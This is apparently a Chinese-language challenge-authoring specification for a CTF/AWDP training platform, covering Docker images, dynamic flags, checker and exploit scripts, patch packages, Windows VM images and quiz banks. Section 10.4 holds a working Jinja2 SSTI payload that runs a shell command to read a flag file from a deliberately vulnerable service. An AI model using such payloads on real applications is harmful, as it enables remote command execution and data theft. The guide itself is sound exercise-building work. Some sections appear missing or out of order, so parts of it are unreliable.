# 出题规范

# 隐域安全综合演练平台出题规范

> 适用对象：CTF 出题人、AWDP 服务开发者、Windows 靶机制作人员、理论题编写人员、培训课程教师、平台管理员。

## 1\. 交付原则

一道题只有同时满足以下条件才算交付完成：

1. 管理端能创建和保存。

2. 普通用户能看到题目。

3. 附件能下载或环境能启动。

4. 正确答案能得分，错误答案不能得分。

5. 页面刷新后实例、附件和完成状态不丢失。

6. 停止或到期后资源被回收。

7. 出题资料中不包含无关密钥、个人信息和生产凭据。

禁止仅提交 Dockerfile、镜像名或 Flag 文本而不提供验证说明。出题人应提交完整“题目交付包”。

建议目录：

## 3\. 命名和版本规范

### 3\.1 题目名称

格式建议：

```Plaintext
分类-知识点-难度-版本
```

示例：

```Plaintext
Web-SSTI-Easy-v1
IR-Windows-EventLog-Medium-v2
AWDP-Flask-SSTI-v1
```

平台显示标题可以使用中文，但文件、镜像 repository 和脚本路径建议使用小写英文、数字、短横线。

### 3\.2 Docker 镜像

```Plaintext
<registry>/<namespace>/<category>/<name>:<version>
```

示例：

```Plaintext
10.24.0.28:5000/gzctf/web/ssti:20260711-v1
```

要求：

- 正式题禁止只使用 `latest`。

- 每次变更使用新 tag。

- 验收报告记录 digest。

- 平台题目中填写完整镜像引用，不能只填模板显示名。

### 3\.3 Flag

推荐格式：

```Plaintext
flag{lowercase_ascii_and_digits}
```

静态 Flag 要求：

- 不包含换行、前后空格和不可见字符。

- 不使用真实密码、手机号、身份证号等信息。

- 题面、附件元数据、Docker history 中不能意外泄漏。

动态 Flag 使用平台注入的 `GZCTF_FLAG`，同时可使用 `GZCTF_TEAM_ID` 识别队伍。镜像内不要自行生成另一套无法被平台判定的 Flag。

## 4\. CTF 题型选择

平台题目类型：

|类型|环境|Flag|适用场景|
|---|---|---|---|
|`StaticAttachment`|无环境|所有队伍相同|Crypto、Reverse、取证附件、纯知识题|
|`StaticContainer`|Docker/WindowsVM|所有队伍相同|固定 Web/Pwn 环境、Windows 靶机|
|`DynamicAttachment`|无环境|每个附件/队伍不同|每队独立流量包、配置文件、数据集|
|`DynamicContainer`|Docker|每队独立|Web/Pwn 动态实例、需要防止 Flag 共享|

附件与环境可以组合：平台支持容器题同时绑定静态附件，例如“源码附件 \+ 在线漏洞环境”。

## 6\. 纯附件静态题

### 6\.1 适用范围

- 压缩包、源码、流量包、内存镜像、磁盘镜像。

- Crypto、Reverse、Forensics。

- 不需要在线环境的理论型实战题。

### 6\.2 配置示例

|页面字段|填写示例|
|---|---|
|标题|`流量分析-登录凭据`|
|分类|`Forensics`|
|类型|`StaticAttachment`|
|环境|`None`|
|初始分|`500`|
|最低分率|`0.2`|
|题面|`下载附件并分析 HTTP 登录流量。`|
|附件|`traffic.pcapng`|
|Flag|`flag{http_basic_auth}`|

### 6\.3 附件要求

- 文件名只使用安全字符，避免控制字符和路径分隔符。

- 压缩包无密码，或在题面明确给出密码。

- 附件 SHA256 写入交付说明。

- 先在干净环境解压和打开。

- 删除作者用户名、绝对路径、编辑器缓存和答案文件。

- 大文件提前验证平台、Nginx 和浏览器下载限制。

### 6\.4 验收

1. 选手页能看到下载按钮。

2. 下载文件 SHA256 与交付值一致。

3. 错误 Flag 不得分。

4. 正确 Flag 得分一次。

5. 榜单和题目解出状态更新。

## 7\. Docker 容器题规范

### 7\.1 Dockerfile 基线

```Dockerfile
FROM python:3.12-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .

ENV PYTHONUNBUFFERED=1
EXPOSE 80

RUN useradd -r -u 10001 ctf && chown -R ctf:ctf /app
USER ctf

CMD ["python", "app.py"]
```

应用必须监听：

```Python
app.run(host="0.0.0.0", port=80)
```

不能只监听 `127.0.0.1`。

### 7\.2 动态 Flag 读取

```Python
import os

FLAG = os.getenv("GZCTF_FLAG", "flag{local_development_only}")
TEAM_ID = os.getenv("GZCTF_TEAM_ID", "local")
```

推荐在容器启动时把 Flag 写入运行时位置：

```Bash
#!/bin/sh
set -eu

printf '%s' "${GZCTF_FLAG:-flag{local_development_only}}" > /tmp/flag
chmod 0400 /tmp/flag
exec python /app/app.py
```

注意：

- 不要在 Dockerfile 中 `ENV GZCTF_FLAG=真实Flag`。

- 不要在镜像 layer、Git 历史、日志中写入正式 Flag。

- 应用只在运行时读取平台注入值。

- 管理员测试实例会注入测试 Flag，不能据此推断正式队伍 Flag。

### 7\.3 资源和进程要求

- 单容器单前台进程，或使用可靠进程管理器。

- 收到 SIGTERM 后应在 10\-30 秒内退出。

- 不依赖宿主机固定路径。

- 不要求特权模式、Docker Socket 或宿主机网络。

- 临时文件写入容器可写目录。

- 默认不依赖公网；确需公网时选择 Open 网络并说明原因。

- 使用非 root 用户，除非题目机制确实需要 root。

### 7\.4 健康检查

交付前至少执行：

```Bash
docker build -t ctf/web-ssti:test .
docker run --rm -d --name web-ssti-test -p 18080:80 \
  -e GZCTF_FLAG='flag{docker_local_test}' \
  -e GZCTF_TEAM_ID='test-team' \
  ctf/web-ssti:test
curl -fsS http://127.0.0.1:18080/
docker logs web-ssti-test
docker stop web-ssti-test
```

### 7\.5 静态容器题

页面填写：

|字段|示例|
|---|---|
|类型|`StaticContainer`|
|环境|`Docker`|
|镜像|`10.24.0.28:5000/gzctf/web/demo:20260711`|
|内部端口|`80`|
|内存|`256 MiB`|
|CPU|`2`，表示约 0\.2 CPU|
|存储|`512 MiB`|
|网络|`Isolated`|
|Flag|通过 Flag 区域添加固定值|

静态容器题的环境中可以包含同一个 Flag，但仍应避免选手直接通过 `docker inspect` 等非预期方式读取。平台远程节点本身必须视为受信基础设施。

### 7\.6 动态容器题

页面填写：

|字段|示例|
|---|---|
|类型|`DynamicContainer`|
|环境|`Docker`|
|镜像|完整 Registry 地址|
|内部端口|应用实际监听端口|
|Flag 模板|`flag{[TEAM_HASH]}`|

动态容器题不要在固定 Flag 列表中添加正式 Flag。平台按队伍生成 Flag，并通过 `GZCTF_FLAG` 注入。

### 7\.7 Docker \+ 附件题

适用于源码审计、补丁对照、客户端程序配合服务端等场景。

配置顺序：

1. 按静态/动态容器题完成环境配置。

2. 在同一编辑页的“题目附件”区域上传本地附件或绑定外链。

3. 保存后使用选手账号确认附件按钮和创建实例按钮同时存在。

2. 点击“注册 Docker 镜像”。

3. 模板名称填人类可读名称。

4. 镜像地址填完整 Registry 引用。

5. 保存并等待状态为就绪。

### 8\.2 方案 B：上传 Docker 包

```Bash
docker save -o web-ssti-20260711.tar ctf/web-ssti:test
```

平台操作：

1. 点击“上传镜像包”。

2. 选择 `.tar/.tar.gz/.tgz`。

4. repository 填 `web/ssti`。

5. tag 填 `20260711`。

6. source image 填归档内原始 tag。

7. 上传后复制平台返回/展示的完整 Registry 地址。

上传的不是 Dockerfile 压缩包，也不是 `docker export` 结果。

### 8\.3 多节点要求

- 所有 Docker 节点必须能解析并访问 Registry 地址。

- HTTP Registry 需要在每个节点配置 insecure registry；HTTPS Registry 应安装 CA。

- 不要把 Registry 地址写死为仅平台主机可访问的回环地址。

- 双网卡环境使用所有节点都可达的内网地址。

- 题目公网访问入口与 Registry 地址是两个概念。

## 9\. 动态附件题规范

动态附件用于每队不同文件/Flag。

要求：

- 每个附件只对应一个 Flag。

- 文件与 Flag 映射表保存在内部交付资料，不发给选手。

- 文件名应唯一，内容差异可验证。

- 不能让 A 队附件中的 Flag 被 B 队正确提交。

平台操作：

1. 新建 `DynamicAttachment`。

2. 环境选择 `None`。

3. 在动态附件区域批量上传文件。

4. 每个文件配置对应 Flag。

5. 确认页面显示已配置数量。

6. 用两个队伍下载并交叉提交测试。

## 10\. AWDP 题目和服务规范

AWDP 交付对象不是单个 Flag 题，而是一套可持续运行、可攻击、可修补、可检查的服务。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODgwNTJjYjdkYjNhY2Q3OWE2MWVhNzljNDFkYjBiNjJfYTg3YTgxY2RkM2Y4ZDQ4MTUwNDE2NDlhODhmNDNlY2FfSUQ6NzY2MTIxNjI0MzYyMTQ0ODY1OF8xNzg0MDE1ODMwOjE3ODQxMDIyMzBfVjM)

### 10\.1 AWDP 服务镜像要求

- 服务必须监听 `0.0.0.0:<ExposePort>`。

- 能从 `GZCTF_FLAG` 读取当前轮/队伍 Flag。

- 服务启动后在合理时间内可用。

- 支持在运行容器中执行 `update.sh` 修补。

- 补丁应用后服务进程能重载或重启。

- 镜像内包含补丁所需 shell 和基础命令。

- 漏洞必须能由 Exp 稳定复现。

- Checker 必须验证核心业务，不只检查 TCP 端口打开。

### 10\.2 管理端字段

|字段|推荐测试值|说明|
|---|---|---|
|服务名称|`SSTI Service`|同一比赛内唯一|
|镜像|完整 Registry 引用|所有目标节点可拉取|
|暴露端口|`80`|容器内部端口|
|Checker 入口|`python3 checker.py`|30 秒超时|
|Exp 入口|`python3 exp.py`|30 秒超时|
|初始分|`1000`|服务基础分|
|攻击分|`50`|每个合法 Flag|
|SLA 分|`20`|按当前计分逻辑|
|修补分|`100`|修补验证成功|
|异常扣分|`200`|服务不可用|
|每轮最大攻击|`3`|每队每服务|
|攻击阶段|测试 `8-10` 分钟|正式按赛制要求|
|修补阶段|测试 `8-10` 分钟|给上传留足时间|
|总轮数|测试 `2`|正式按赛制要求|

### 10\.3 Checker 规范

平台传入环境变量：

```Plaintext
AWDP_TARGET_HOST
AWDP_TARGET_PORT
AWDP_FLAG
AWDP_SERVICE_ID
AWDP_SERVICE_NAME
AWDP_TEAM_ID
```

Checker 最后一行的第一个状态词必须为：

```Plaintext
OK
MUMBLE
DOWN
CORRUPT
```

示例：

```Python
#!/usr/bin/env python3
import os
import sys
import requests

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
flag = os.environ["AWDP_FLAG"]

try:
    response = requests.get(f"http://{host}:{port}/health", timeout=5)
    if response.status_code != 200:
        print(f"MUMBLE unexpected status={response.status_code}")
        sys.exit(0)

    flag_response = requests.get(f"http://{host}:{port}/internal/flag-check", timeout=5)
    if flag not in flag_response.text:
        print("CORRUPT flag storage mismatch")
        sys.exit(0)

    print("OK service and flag are healthy")
except requests.RequestException as exc:
    print(f"DOWN {exc}")
```

规范：

- 单次运行应在 5\-10 秒内完成。

- 所有网络请求设置 timeout。

- 不输出完整 Flag。

- 输出可定位原因，但不泄漏敏感数据。

- Checker 成功退出码建议为 0；脚本自身异常使用非 0。

### 10\.4 Exp 规范

Exp 退出码：

- `0`：漏洞利用成功，漏洞仍存在。

- 非 `0`：漏洞利用失败，结合 Checker 结果判断是否修复。

示例：

```Python
#!/usr/bin/env python3
import os
import sys
import requests

host = os.environ["AWDP_TARGET_HOST"]
port = int(os.environ["AWDP_TARGET_PORT"])
expected = os.environ["AWDP_FLAG"]

payload = "{{config.__class__.__init__.__globals__['os'].popen('cat /tmp/flag').read()}}"

try:
    response = requests.post(
        f"http://{host}:{port}/render",
        data={"name": payload},
        timeout=5,
    )
except requests.RequestException:
    sys.exit(2)

sys.exit(0 if expected in response.text else 1)
```

Exp 必须稳定、可重复，不能依赖随机竞争或外部公网服务。

### 10\.5 修补包规范

平台只接受 `.tar.gz` 或 `.tgz`，最大 16 MiB、最多 512 个 entry，根目录必须包含 `update.sh`。

禁止：

- 绝对路径。

- `..` 路径穿越。

- 符号链接和硬链接。

- block/character device。

- FIFO。

`update.sh` 示例：

```Bash
#!/bin/sh
set -eu

install -m 0644 ./files/app.py /app/app.py

if command -v pkill >/dev/null 2>&1; then
  pkill -HUP -f 'python.*app.py' || true
fi

exit 0
```

目录：

```Plaintext
patch/
├─ update.sh
└─ files/
   └─ app.py
```

打包时必须让 `update.sh` 位于归档根部：

```Bash
cd patch
tar -czf ../ssti-fix-v1.tgz update.sh files
tar -tzf ../ssti-fix-v1.tgz
```

### 10\.6 AWDP 验收标准

1. A/B 两队实例都能启动。

2. Checker 正常时显示 OK。

3. A 队能通过漏洞取得 B 队 Flag。

4. A 队提交后得分，重复提交不得分。

5. 自己队伍 Flag 被拒绝。

6. 进入修补阶段后可上传合法补丁。

7. 修补后 Checker 通过且 Exp 失败。

8. 修补分计入榜单。

9. 重置/恢复次数正确。

10. 停止比赛后实例和端口全部清理。

当前已知限制：自动应用补丁只支持本地容器后端；AWDP 服务若调度到远程 Fleet 节点，会返回“不支持远程节点补丁应用”。正式多节点 AWDP 上线前必须补齐该能力或固定 AWDP 到支持修补的本地节点。

## 11\. Windows 镜像制作规范

### 11\.1 基础要求

- 推荐输出 QCOW2。

- 操作系统已激活或符合授权要求。

- 安装 VirtIO 网卡/磁盘驱动。

- **启用 RDP。**

- **防火墙允许 RDP 和题目所需服务。**

- 配置固定的题目测试账号，不使用个人账号。

- 自动登录仅在确有展示需求时启用。

- 禁止保存域账号、浏览器个人 Cookie、SSH 私钥和生产凭据。

- 关机后再上传镜像，禁止上传运行中的不一致磁盘。

### 11\.2 PVE 制作建议

1. 在 PVE 创建临时 Windows VM。

2. 磁盘控制器使用 VirtIO SCSI，安装 VirtIO 驱动。

3. 安装题目程序、日志、恶意样本或取证数据。

4. 创建专用本地用户和密码。

5. 开启 RDP，确认从同网段可登录。

6. 清理更新缓存、临时文件和作者痕迹。

7. 根据题目需要决定是否执行 Sysprep。

8. 完全关机。

9. 导出或转换磁盘。

查找磁盘：

```Bash
qm config <VMID>
```

转换示例：

```Bash
qemu-img convert -p -f raw -O qcow2 /path/to/source.raw windows-ir-v1.qcow2
qemu-img info windows-ir-v1.qcow2
qemu-img check windows-ir-v1.qcow2
sha256sum windows-ir-v1.qcow2 > windows-ir-v1.qcow2.sha256
```

如果源磁盘已经是 QCOW2，可使用：

```Bash
qemu-img convert -p -f qcow2 -O qcow2 -c source.qcow2 windows-ir-v1.qcow2
```

### 11\.3 静态 Flag 放置

可放在：

- 桌面文本文件。

- 注册表键值。

- Windows Event Log。

- IIS 配置或应用目录。

- 内存/磁盘取证数据中。

Flag 不应在登录欢迎语、最近文件列表等位置意外暴露。

当前普通比赛 Windows VM 创建链路传给 VM 的动态 Flag 为 `null`，本阶段应使用静态 Flag。不要宣称 Windows 动态 Flag 已支持，除非单独完成注入 Agent/Cloudbase\-Init 和端到端验证。

### 11\.4 上传平台

1. 进入 `管理 -> 环境模板`。

2. 上传 `.qcow2/.ova/.vmdk/.img`，或上传包含 VM 文件的 `.zip/.tar.gz/.tar.xz`。

3. 文件名包含 `windows` 或 `winserver`，便于系统识别 OS。

4. 等待状态 Ready。

5. 检查 OS 类型为 Windows、SHA256 存在、大小合理。

6. 确认 KVM 节点在线且可调度。

7. 新建题目，类型 `StaticContainer`，环境 `WindowsVM`。

8. 从下拉框选择模板，不在 Docker 镜像字段填写文件名。

9. 添加静态 Flag，启用题目。

10. 用选手账号创建 VM 并通过 RDP/Guacamole 访问。

### 11\.5 Windows 验收

- VM 能在目标 KVM 节点启动。

- IP、RDP 端口和 Guacamole 入口正确。

- 远程登录凭据有效。

- 题目服务开机自启动。

- 重启 VM 后服务仍可用。

- Flag 可按预期解出。

- 停止后 VM 和远程连接记录被清理。

## 12\. 理论题目规范

理论模块支持：

- `SingleChoice`：单选。

- `MultipleChoice`：多选，完全一致才得分。

- `TrueFalse`：判断。

答案下标从 `0` 开始。

### 12\.1 题库 JSON

推荐格式：

```JSON
{
  "questions": [
    {
      "type": "SingleChoice",
      "bankName": "Web基础-单选",
      "title": "HTTP 默认端口是？",
      "content": "请选择 HTTP 协议默认端口。",
      "options": ["21", "22", "80", "443"],
      "answerIndexes": [2]
    },
    {
      "type": "MultipleChoice",
      "bankName": "Web基础-多选",
      "title": "以下哪些属于 HTTP 请求方法？",
      "content": "多选题必须完全一致才得分。",
      "options": ["GET", "POST", "SELECT", "PUT"],
      "answerIndexes": [0, 1, 3]
    },
    {
      "type": "TrueFalse",
      "bankName": "Web基础-判断",
      "title": "HTTPS 一定使用 443 端口。",
      "content": "端口可以自定义。",
      "options": ["正确", "错误"],
      "answerIndexes": [1]
    }
  ]
}
```

可直接使用：`docs/examples/theory-bank-sample.json`。

### 12\.2 字段规则

|字段|规则|
|---|---|
|`type`|推荐使用标准英文枚举|
|`bankName`|题库名称，最长 128 字符|
|`title`|必填题干|
|`content`|解析、补充材料或 Markdown 内容|
|`options`|单选/多选至少 2 个；判断固定 2 个|
|`answerIndexes`|必填、去重、从 0 开始|

单选和判断只能有一个正确下标；多选可以有多个。

## 13\. 培训课程题目规范

培训题目和比赛题目数据隔离，不同课程之间也隔离。

要求：

- 课程环境模板必须带 `CourseId` 归属。

- 教师只能看到本课程模板和题目。

- 课程题可以是附件、Docker、Windows VM 或附件 \+ 环境。

- Flag 判定沿用平台题目机制。

- 章节可以绑定课程题目和章节理论测试。

### 13\.1 课程实验题

1. 教师进入课程详情。

2. 打开“环境模板”，注册或上传本课程镜像。

3. 打开“题目管理”。

4. 新建题目，填写环境、镜像、端口、资源、Flag。

5. 上传并绑定附件。

6. 保存后再次打开题目，确认可编辑。

7. 编辑章节，把题目绑定到章节末尾。

8. 学生启动实例、查看剩余时间、提交 Flag。

### 13\.2 课程理论题库和章节测试

1. 在课程详情打开“理论题库”。

2. 创建/导入课程共享题目。

3. 编辑章节，点击“配置课后练习”。

4. 从课程题库选题并设置分值。

5. 保存并发布。

6. 学生在章节末尾点击“进入测试”。

规则：允许草稿，最终提交一次，提交后不可改，多选完全一致得分。

## 14\. 题面编写规范

题面必须包括：

- 任务背景。

- 明确目标。

- Flag 格式。

- 附件说明。

- 环境启动说明。

- 必要的连接方式和端口说明。

- 允许/禁止事项。

示例：

```Markdown
# SSTI 入门

启动题目实例后，访问页面并分析模板渲染逻辑。

目标：读取容器内 `/tmp/flag` 的内容。

Flag 格式：`flag{...}`

附件 `source.zip` 为本题 Web 应用源码。
```

不要在题面中写：

- “自己试试”“懂的都懂”等模糊说明。

- 错误的默认端口。

- 已废弃镜像地址。

- 管理端路径或后台凭据。
